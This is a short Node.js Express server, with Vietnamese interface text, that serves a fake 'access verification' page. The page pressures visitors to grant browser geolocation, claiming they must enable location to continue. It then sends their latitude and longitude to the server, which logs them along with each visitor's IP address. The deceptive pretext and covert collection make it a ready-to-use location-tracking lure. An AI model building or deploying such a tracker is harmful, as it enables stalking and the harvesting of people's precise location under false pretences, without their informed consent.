const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// API lấy IP + trả về frontend
app.get("/", (req, res) => {
  const ip =
    req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  console.log("IP truy cập:", ip);

  res.send(`
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
</head>
<body style="font-family: Arial; text-align: center; padding-top: 50px;">

  <h2 id="title">🔒 Xác minh truy cập</h2>
  <p id="desc">Nhấn nút bên dưới để tiếp tục</p>

  <button onclick="requestLocation()" 
    style="padding: 12px 20px; font-size: 16px; cursor: pointer;">
    Tiếp tục
  </button>

  <script>
    function requestLocation() {
      document.getElementById("desc").innerText = "Đang yêu cầu quyền vị trí...";

      navigator.geolocation.getCurrentPosition(
        (position) => {
          fetch("/save", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
              lat: position.coords.latitude,
              lng: position.coords.longitude
            })
          }).then(() => {
            document.body.innerHTML = "<h2>✅ Xác minh thành công</h2>";
          });
        },
        (error) => {
          document.body.innerHTML = \`
            <h2>❌ Bạn phải bật vị trí để tiếp tục</h2>
            <p>Vui lòng cấp quyền và thử lại</p>
            <button onclick="requestLocation()">Thử lại</button>
          \`;
        }
      );
    }
  </script>

</body>
</html>
`);
});

// API lưu dữ liệu
app.post("/save", (req, res) => {
  const ip =
    req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  const { lat, lng } = req.body;

  console.log("===== DATA =====");
  console.log("IP:", ip);
  console.log("Lat:", lat);
  console.log("Lng:", lng);

  res.send("OK");
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server chạy tại port " + PORT);
});